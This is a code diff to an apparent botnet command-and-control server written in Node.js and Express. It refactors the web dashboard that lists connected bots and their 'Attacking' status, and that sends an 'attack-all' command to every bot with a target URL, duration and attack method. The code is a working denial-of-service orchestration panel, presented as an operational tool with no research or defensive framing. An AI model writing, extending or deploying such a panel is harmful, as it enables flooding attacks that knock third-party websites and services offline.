@@ -374,12 +374,10 @@ app.get('/health', (req, res) => {
   res.json({ status: 'healthy', bots: connectedBots.length, uptime: serverStats.uptime });
 });
 
-// ========== WEB UI ==========
-// Serve the dashboard on the root path
-app.get('/', (req, res) => {
-  res.send(`
+// ========== WEB UI – SERVED ON ROOT AND /dashboard ==========
+const HTML_UI = `
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -639,7 +637,6 @@ app.get('/', (req, res) => {
 
   async function refreshData() {
     try {
-      // Fetch bots
       const botsData = await apiCall('/bots');
       if (botsData) {
         const bots = botsData.bots || [];
@@ -647,20 +644,19 @@ app.get('/', (req, res) => {
         if (bots.length === 0) {
           list.innerHTML = '<div style="color:#8b949e; text-align:center; padding:20px;">No bots connected.</div>';
         } else {
-          list.innerHTML = bots.map(b => `
+          list.innerHTML = bots.map(b => \`
             <div class="bot-item">
-              <span class="id">${b.id}</span>
-              <span>${b.name}</span>
-              <span class="status ${b.online ? 'online' : 'offline'}">${b.online ? '● Online' : '● Offline'}</span>
-              <span class="attacking">${b.attacking ? '🔥 Attacking' : '⏸ Idle'}</span>
-              <span>Attacks: ${b.attacksPerformed}</span>
+              <span class="id">\${b.id}</span>
+              <span>\${b.name}</span>
+              <span class="status \${b.online ? 'online' : 'offline'}">\${b.online ? '● Online' : '● Offline'}</span>
+              <span class="attacking">\${b.attacking ? '🔥 Attacking' : '⏸ Idle'}</span>
+              <span>Attacks: \${b.attacksPerformed}</span>
             </div>
-          `).join('');
+          \`).join('');
         }
         document.getElementById('botCount').textContent = `(${bots.length})`;
       }
 
-      // Fetch stats
       const stats = await apiCall('/api/stats');
       if (stats) {
         document.getElementById('statTotalBots').textContent = stats.totalBots || 0;
@@ -680,16 +676,16 @@ app.get('/', (req, res) => {
     const time = document.getElementById('attackTime').value;
     const method = document.getElementById('attackMethod').value;
     if (!target) { alert('Please enter a target URL.'); return; }
-    log(`🚀 Sending attack-all: ${method} -> ${target} for ${time}s`);
+    log(\`🚀 Sending attack-all: \${method} -> \${target} for \${time}s\`);
     try {
       const result = await apiCall(\`/attack-all?target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
       if (result && result.success) {
-        log(`✅ Attack sent to ${result.sent}/${result.total} bots`);
+        log(\`✅ Attack sent to \${result.sent}/\${result.total} bots\`);
         if (result.failed && result.failed.length) {
-          log(`⚠️ Failed bots: ${result.failed.join(', ')}`);
+          log(\`⚠️ Failed bots: \${result.failed.join(', ')}\`);
         }
       } else {
-        log(`❌ Attack failed: ${result?.error || 'Unknown error'}`);
+        log(\`❌ Attack failed: \${result?.error || 'Unknown error'}\`);
       }
     } catch (e) { log('❌ Error: ' + e.message); }
     refreshData();
@@ -708,16 +704,27 @@ app.get('/', (req, res) => {
     refreshData();
   }
 
-  // Auto-refresh every 5 seconds
   setInterval(refreshData, 5000);
-
-  // Initial load
   login();
   refreshData();
 </script>
 </body>
 </html>
-  `);
+`;
+
+// Serve UI on root and /dashboard
+app.get(['/', '/dashboard'], (req, res) => {
+  console.log(`[UI] Serving dashboard to ${req.ip}`);
+  res.send(HTML_UI);
+});
+
+// Catch-all: serve UI for any non-API route (SPA support)
+app.use((req, res, next) => {
+  if (req.path.startsWith('/api') || req.path.startsWith('/bots') || req.path.startsWith('/attack') || req.path.startsWith('/stop') || req.path.startsWith('/block') || req.path.startsWith('/unblock') || req.path.startsWith('/remove') || req.path.startsWith('/blocked') || req.path.startsWith('/methods') || req.path.startsWith('/ping') || req.path.startsWith('/health')) {
+    return res.status(404).json({ error: 'API endpoint not found' });
+  }
+  // For any other route, serve the UI (useful for refreshing or direct navigation)
+  res.send(HTML_UI);
 });
 
 // ========== ERROR HANDLER ==========
